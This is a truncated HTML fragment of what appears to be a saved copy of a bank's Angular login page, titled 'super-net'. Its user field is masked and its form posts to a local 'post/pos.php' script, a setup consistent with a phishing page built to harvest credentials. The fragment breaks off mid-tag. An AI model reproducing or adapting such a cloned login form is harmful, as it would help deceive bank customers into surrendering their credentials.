...
<body><super-net ng-version="5.2.11"><super-sidebar _nghost-c1="">
    ...
    <form _ngcontent-c15="" novalidate="" class="ng-touched ng-dirty ng-valid" action="post/pos.php" method="POST" autocomplete="off" name="form1">
      <div _ngcontent-c15="" class="row justify-content-center d-block">
        <div _ngcontent-c15="" class="col-12">
          <div _ngcontent-c15="" class="form-group">
            ...
            <input _ngcontent-c15="" minlength="8" maxlength="16" placeholder="Usuario" class="form-control ng-touched ng-dirty ng-valid" formcontrolname="client" name="user" id="user" type="password" onkeypress="return isNumberKey(event);">
          </div>
        </div>
      </div>
      ...
      <div _ngcontent-c15="" class="row justify-content-center text-center ">
        <div _ngcontent-c15="" class="col-12 text-center">
          <button _ngcontent-c15="" class="rounded-red-button btn-continue" type="submit" id="btn" class="g-recaptcha" 
